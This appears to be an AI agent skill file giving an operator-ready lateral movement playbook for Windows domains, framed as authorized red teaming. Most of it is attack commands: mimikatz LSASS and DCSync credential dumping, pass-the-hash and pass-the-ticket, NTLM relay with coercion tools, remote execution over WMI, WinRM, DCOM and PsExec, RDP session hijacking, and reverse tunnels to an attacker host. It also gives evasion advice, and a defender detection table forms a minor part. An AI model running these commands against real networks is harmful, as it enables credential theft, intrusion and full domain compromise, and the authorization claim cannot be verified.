---
name: offensive-lateral-movement
description: "Comprehensive lateral movement tradecraft for authorized red team engagements covering credential-based movement (pass-the-hash, pass-the-ticket, overpass-the-hash), NTLM relay attacks (ntlmrelayx with PetitPotam, DFSCoerce, PrinterBug coercion), remote execution protocols (WMI, WinRM, DCOM, PsExec and alternatives), RDP session hijacking, and network pivoting through tunneling tools (chisel, ligolo-ng, SSH tunnels, SOCKS proxies). Provides operator-ready command sequences for mimikatz, crackmapexec/netexec, impacket suite, and evil-winrm with emphasis on OPSEC considerations, SMB signing bypass, and detection evasion. Maps to MITRE ATT&CK T1021 (Remote Services), T1550 (Use Alternate Authentication Material), and sub-techniques. Includes defender-perspective detection guidance for blue team awareness and a rapid engagement cheatsheet for common lateral movement scenarios encountered during internal penetration tests and assumed-breach exercises."
---

# Offensive Lateral Movement

Lateral movement is the phase where you expand access across a network after
initial compromise. You pivot from one system to another using harvested
credentials, token manipulation, or protocol abuse. The goal is to reach
high-value targets -- domain controllers, database servers, file shares --
while minimizing detection footprint. Every technique here assumes you hold
at least one valid credential or session token on the current host.

This skill covers credential-based movement, NTLM relay, remote execution
protocols, session hijacking, and network tunneling. Apply these in authorized
engagements only.

## Quick Workflow

1. Enumerate accessible hosts and open ports (445, 5985, 5986, 3389, 22, 135).
2. Harvest credentials from the current host (LSASS, SAM, cached creds).
3. Test credential reuse across discovered hosts with crackmapexec/netexec.
4. Select a movement technique based on available credentials and target services.
5. Establish persistence on the new host before moving further.
6. Set up tunneling if you need to reach segmented networks.
7. Document each pivot for your engagement report.

---

## Pass-the-Hash

Pass-the-hash (PtH) lets you authenticate with an NTLM hash without knowing
the plaintext password. You extract hashes from LSASS, the SAM database, or
NTDS.dit, then inject them into authentication requests.

Extract hashes with mimikatz on the current host:

```powershell
# Elevate to debug privilege and dump logon passwords
privilege::debug
sekurlsa::logonpasswords

# Dump SAM hashes (requires SYSTEM)
lsadump::sam

# Dump domain hashes from ntds.dit (on a DC)
lsadump::dcsync /domain:corp.local /all /csv
```

Use crackmapexec (or netexec) to spray the hash across the network:

```bash
# Test a single hash against a subnet
crackmapexec smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Execute a command on a target via PtH
crackmapexec smb 10.10.10.50 -u admin -H <NT_HASH> -x "whoami /all"

# netexec (modern fork) with same syntax
nxc smb 10.10.10.0/24 -u admin -H <NT_HASH> --shares
```

Use impacket for shell access:

```bash
# PtH with psexec
impacket-psexec -hashes aad3b435b51404ee:<NT_HASH> corp.local/administrator@10.10.10.50

# PtH with wmiexec (stealthier, no service creation)
impacket-wmiexec -hashes aad3b435b51404ee:<NT_HASH> corp.local/administrator@10.10.10.50

# PtH with evil-winrm
evil-winrm -i 10.10.10.50 -u administrator -H <NT_HASH>
```

OPSEC note: PsExec creates a service on the target (event 7045). Prefer
wmiexec or evil-winrm when possible. Crackmapexec with `--no-bruteforce`
prevents lockouts when testing multiple users against multiple hashes.

---

## Pass-the-Ticket and Overpass-the-Hash

Pass-the-ticket (PtT) injects a stolen Kerberos TGT or TGS into your session,
letting you authenticate as the ticket owner. Overpass-the-hash converts an
NTLM hash into a Kerberos ticket, giving you Kerberos-based access from a
hash alone.

Export tickets from memory with mimikatz:

```powershell
# List all Kerberos tickets in memory
sekurlsa::tickets /export

# Inject a stolen TGT into the current session
kerberos::ptt C:\tickets\admin_krbtgt.kirbi
```

Overpass-the-hash -- request a Kerberos TGT using an NTLM hash:

```powershell
# Overpass-the-hash: create a new logon session with the hash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /run:powershell.exe
```

From Linux using impacket:

```bash
# Request a TGT with a hash (overpass-the-hash)
impacket-getTGT -hashes aad3b435b51404ee:<NT_HASH> corp.local/administrator

# Set the ticket in the environment
export KRB5CCNAME=administrator.ccache

# Use the ticket with psexec
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

Request a service ticket for a specific SPN:

```bash
# Get a TGS for CIFS service on a target
impacket-getST -spn cifs/fileserver.corp.local -hashes aad3b435b51404ee:<NT_HASH> corp.local/administrator
```

OPSEC note: Kerberos authentication generates event 4768 (TGT request) and
4769 (TGS request). Overpass-the-hash produces an anomalous 4768 with RC4
encryption when AES is the domain default -- this is a known detection signal.

---

## NTLM Relay Attacks

NTLM relay captures authentication attempts and forwards them to a target
service. You coerce a machine to authenticate to your listener, then relay
that authentication to another host where SMB signing is not enforced.

Check SMB signing across the network:

```bash
# Identify hosts without SMB signing required
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Alternative with nmap
nmap --script smb2-security-mode -p 445 10.10.10.0/24
```

Set up ntlmrelayx to relay captured authentication:

```bash
# Relay to targets without SMB signing, dump SAM
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay and execute a command
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\\relay_proof.txt"

# Relay to LDAP for delegation abuse or shadow credentials
impacket-ntlmrelayx -t ldaps://dc01.corp.local --shadow-credentials --shadow-target ws01$

# Relay to ADCS web enrollment for certificate theft
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Coerce authentication with PetitPotam (MS-EFSR abuse):

```bash
# Unauthenticated coercion (patched but often still works)
python3 PetitPotam.py <LISTENER_IP> <TARGET_DC_IP>

# Authenticated coercion
python3 PetitPotam.py -u user -p password -d corp.local <LISTENER_IP> <TARGET_DC_IP>
```

Coerce with DFSCoerce (MS-DFSNM):

```bash
python3 dfscoerce.py -u user -p password -d corp.local <LISTENER_IP> <TARGET_DC_IP>
```

Coerce with PrinterBug (MS-RPRN):

```bash
python3 printerbug.py corp.local/user:password@<TARGET_DC_IP> <LISTENER_IP>
```

Set up Responder for poisoning and capture:

```bash
# Poison LLMNR/NBT-NS and capture hashes
responder -I eth0 -wFb

# Run in analysis mode first to identify traffic
responder -I eth0 -A
```

OPSEC note: NTLM relay is noisy. Responder poisoning is detectable by
monitoring for duplicate name resolution responses. PetitPotam coercion
generates event 4624 type 3 logons from the DC to your listener.

---

## Remote Execution Methods

Multiple protocols allow remote command execution once you have valid
credentials. Each leaves a different forensic footprint.

### WMI Execution

```bash
# impacket wmiexec -- semi-interactive shell via WMI
impacket-wmiexec corp.local/admin:Password1@10.10.10.50

# Execute a single command
impacket-wmiexec corp.local/admin:Password1@10.10.10.50 "ipconfig /all"

# With hash
impacket-wmiexec -hashes :<NT_HASH> corp.local/admin@10.10.10.50
```

WMI does not create a service. Output is written to a temporary file on the
ADMIN$ share and read back. Generates WMI event logs (Microsoft-Windows-WMI-Activity).

### WinRM / PSRemoting

```bash
# evil-winrm interactive shell
evil-winrm -i 10.10.10.50 -u admin -p 'Password1'

# With hash
evil-winrm -i 10.10.10.50 -u admin -H <NT_HASH>

# Upload/download files
upload /local/path/payload.exe C:\Windows\Temp\payload.exe
download C:\Users\admin\Desktop\flag.txt /local/loot/flag.txt
```

```powershell
# Native PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName 10.10.10.50 -Credential $cred
Invoke-Command -ComputerName 10.10.10.50 -Credential $cred -ScriptBlock { whoami }
```

WinRM requires port 5985 (HTTP) or 5986 (HTTPS) open and the user in the
Remote Management Users group (or local admin).

### PsExec and Alternatives

```bash
# impacket psexec -- creates a service, uploads binary
impacket-psexec corp.local/admin:Password1@10.10.10.50

# smbexec -- no binary upload, uses cmd.exe service
impacket-smbexec corp.local/admin:Password1@10.10.10.50

# atexec -- scheduled task execution
impacket-atexec corp.local/admin:Password1@10.10.10.50 "whoami"

# dcomexec -- DCOM MMC20.Application or ShellWindows
impacket-dcomexec -object MMC20 corp.local/admin:Password1@10.10.10.50
```

### DCOM Lateral Movement

```powershell
# Instantiate MMC20.Application on remote host
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.50"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\dcom_proof.txt","7")

# ShellWindows method
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.50"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

DCOM requires port 135 plus dynamic RPC ports. Generates DCOM event logs
(DistributedCOM 10016 errors are common indicators).

---

## RDP Session Hijacking

If you have SYSTEM on a terminal server, you can hijack disconnected RDP
sessions without knowing the session owner's password.

```powershell
# List active sessions
query user

# Hijack a disconnected session (requires SYSTEM context)
# Session ID 2, redirect to your console session
tscon 2 /dest:console

# Create a service to run tscon as SYSTEM
sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
net start sesshijack
```

This technique (T1563.002) is powerful on jump servers where administrators
leave sessions disconnected. It produces event 4778 (session reconnected)
and 4779 (session disconnected).

---

## SSH Pivoting and Tunneling

When you land on a Linux host or a Windows host with OpenSSH, you set up
tunnels to reach otherwise inaccessible network segments.

### SSH Tunnels

```bash
# Local port forward: access 10.10.20.50:445 through pivot host
ssh -L 8445:10.10.20.50:445 user@pivot-host

# Dynamic SOCKS proxy through pivot host
ssh -D 1080 user@pivot-host

# Use proxychains with the SOCKS proxy
proxychains crackmapexec smb 10.10.20.0/24

# Remote port forward: expose internal service to your attack box
ssh -R 8080:127.0.0.1:80 user@attack-box
```

### Chisel

```bash
# On your attack box (server mode)
chisel server --reverse --port 8080

# On the pivot host (client, reverse SOCKS)
chisel client <ATTACK_IP>:8080 R:socks

# This creates a SOCKS5 proxy on attack box port 1080
# Use with proxychains
proxychains impacket-psexec corp.local/admin:Password1@10.10.20.50
```

### Ligolo-ng

```bash
# On attack box: start the proxy
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On pivot host: connect the agent
ligolo-agent -connect <ATTACK_IP>:11601 -ignore-cert

# In the ligolo interface, add a route to the target network
>> session
>> ifconfig
>> start
# On attack box, add route
sudo ip route add 10.10.20.0/24 dev ligolo
```

Ligolo-ng creates a TUN interface on your attack box, giving you direct
IP-layer access to the target network without needing proxychains. This is
significantly more reliable than SOCKS proxying for tools that do not
support proxy configuration.

### Double Pivots

```bash
# Chain two SSH tunnels for multi-hop pivoting
# Hop 1: pivot1 can reach pivot2
ssh -L 2222:pivot2:22 user@pivot1

# Hop 2: through pivot2 to the final target network
ssh -L 8445:10.10.30.50:445 -p 2222 user@127.0.0.1

# Chisel double pivot
# Attack -> pivot1 -> pivot2 -> target
# On pivot1: chisel server + client chained
chisel server --port 9001 --reverse
chisel client <ATTACK_IP>:8080 R:socks
# On pivot2: connect through pivot1
chisel client pivot1:9001 R:1081:socks
```

---

## Detection / Defender View

Understand what defenders look for so you can assess detection risk.

| Technique | Primary Detection | Event IDs / Logs |
|-----------|------------------|------------------|
| Pass-the-Hash | NTLM logon with type 3, no preceding type 10 | 4624 (logon type 3, 9) |
| Pass-the-Ticket | TGT request with RC4 when AES is default | 4768, 4769 |
| NTLM Relay | Machine account authenticating to unusual services | 4624, NTLM audit logs |
| PsExec | Service creation, ADMIN$ share access | 7045, 5145 |
| WMI | WMI process creation, temp file on ADMIN$ | WMI-Activity, 4688 |
| WinRM | WSMan connection, PowerShell remoting logs | Microsoft-Windows-WinRM |
| DCOM | DistributedCOM errors, RPC traffic | 10016, 4688 |
| RDP Hijack | Session reconnect without logon | 4778, 4779 |
| Chisel/Ligolo | Unusual outbound connections, TUN interface | Netflow, Sysmon 3 |

Key defender controls you will encounter:
- **SMB signing enforcement** blocks relay attacks entirely.
- **Credential Guard** prevents LSASS hash extraction on modern Windows.
- **Windows Defender Credential Guard** protects Kerberos tickets in memory.
- **LAPS** makes local admin hashes unique per host, limiting PtH scope.
- **Tiered administration** restricts where privileged accounts can log on.
- **Network segmentation** limits lateral reachability.
- **Sysmon** with proper configuration captures process creation, network connections, and named pipe events that reveal most techniques here.

---

## Engagement Cheatsheet

Rapid reference for common lateral movement scenarios:

```text
SCENARIO                          TECHNIQUE                    TOOL / COMMAND
-------------------------------   --------------------------   ----------------------------------------
Have NTLM hash, SMB open          Pass-the-Hash                crackmapexec smb -H / impacket-wmiexec -hashes
Have NTLM hash, WinRM open        PtH over WinRM               evil-winrm -H
Have cleartext creds               PSRemoting / WinRM           evil-winrm -u -p / Enter-PSSession
Have Kerberos ticket               Pass-the-Ticket              export KRB5CCNAME= / kerberos::ptt
No creds, SMB signing off          NTLM Relay                   ntlmrelayx + PetitPotam/Responder
SYSTEM on terminal server          RDP Hijack                   tscon <ID> /dest:console
Need to reach segmented net        Tunneling                    chisel / ligolo-ng / ssh -D
Linux pivot host                   SSH tunneling                ssh -D 1080 / ssh -L
Need full IP-layer access          Ligolo-ng                    ligolo-proxy + ligolo-agent
Multi-hop pivot                    Chained tunnels              SSH ProxyJump / chisel chain
Domain creds, want Kerberos        Overpass-the-Hash            sekurlsa::pth / impacket-getTGT
Need stealth execution             WMI / DCOM                   impacket-wmiexec / dcomexec
```

MITRE ATT&CK references:
- T1021 -- Remote Services (.001 RDP, .002 SMB, .003 DCOM, .004 SSH, .006 WinRM)
- T1550 -- Use Alternate Authentication Material (.002 PtH, .003 PtT)
- T1557 -- Adversary-in-the-Middle (.001 LLMNR/NBT-NS Poisoning)
- T1563 -- Remote Service Session Hijacking (.002 RDP Hijacking)

---

## Key References

- Mimikatz wiki: https://github.com/gentilkiwi/mimikatz/wiki
- Impacket examples: https://github.com/fortra/impacket/tree/master/examples
- CrackMapExec / NetExec documentation: https://www.netexec.wiki/
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
- Chisel: https://github.com/jpillora/chisel
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng
- PetitPotam: https://github.com/topotam/PetitPotam
- DFSCoerce: https://github.com/Wh04m1001/DFSCoerce
- The Hacker Recipes -- NTLM relay: https://www.thehacker.recipes/ad/movement/ntlm/relay
- MITRE ATT&CK Lateral Movement: https://attack.mitre.org/tactics/TA0008/
